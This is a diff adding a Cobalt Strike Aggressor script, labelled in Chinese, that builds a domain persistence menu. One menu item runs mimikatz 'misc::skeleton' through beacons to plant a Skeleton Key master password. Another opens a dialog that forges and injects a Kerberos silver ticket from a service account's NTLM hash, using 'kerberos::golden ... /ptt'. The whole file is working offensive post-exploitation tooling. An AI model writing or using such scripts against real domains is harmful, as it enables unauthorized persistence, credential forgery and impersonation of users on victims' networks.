@@ -1,0 +1,41 @@
+    	menu "权限维持" {
+    	item "Skeleton(万能密码)"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_skeleton($1);
+            }
+    	}
+
+    sub mimikatz_skeleton{
+		bmimikatz($1 , "misc::skeleton");
+	}
+    item "白银票据" {
+      dialog_show($dialog);
+      local('$bid');
+      foreach $bid ($1){
+        $beaconid = $1;
+            }
+      }
+
+sub callback {
+      $user = $3["user"];
+      $id = $3["id"];
+      $domain = $3["domain"];
+      $sid = $3["sid"];
+      $target = $3["target"];
+      $rc4 = $3["rc4"];
+      $service = $3["service"];
+      bmimikatz($beaconid, "kerberos::golden /user:$user /id:$id /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /ptt exit");
+}
+
+        $dialog = dialog("白银票据", %(user => "user" , id => "500" , domain => "domain" , sid => "sid" , target => "DC-waf.com" , rc4 => "NTLM" , service => "cifs"), &callback);
+        dialog_description($dialog, "白银票据利用: 攻击者必须获得目标服务账号的密码hash值"); #介绍
+        drow_text($dialog, "user", "伪造用户名: "); #文本
+        drow_text($dialog, "id", "id值: "); #文本
+        drow_text($dialog, "domain", "域名: "); #文本
+        drow_text($dialog, "sid", "sid: "); #文本
+        drow_text($dialog, "target", "目标主机名: "); #文本
+        drow_text($dialog, "rc4", "hash(NTLM): "); #文本
+        drow_text($dialog, "service", "伪造的服务: "); #文本  
+        dbutton_action($dialog, "开始"); #按钮
+}
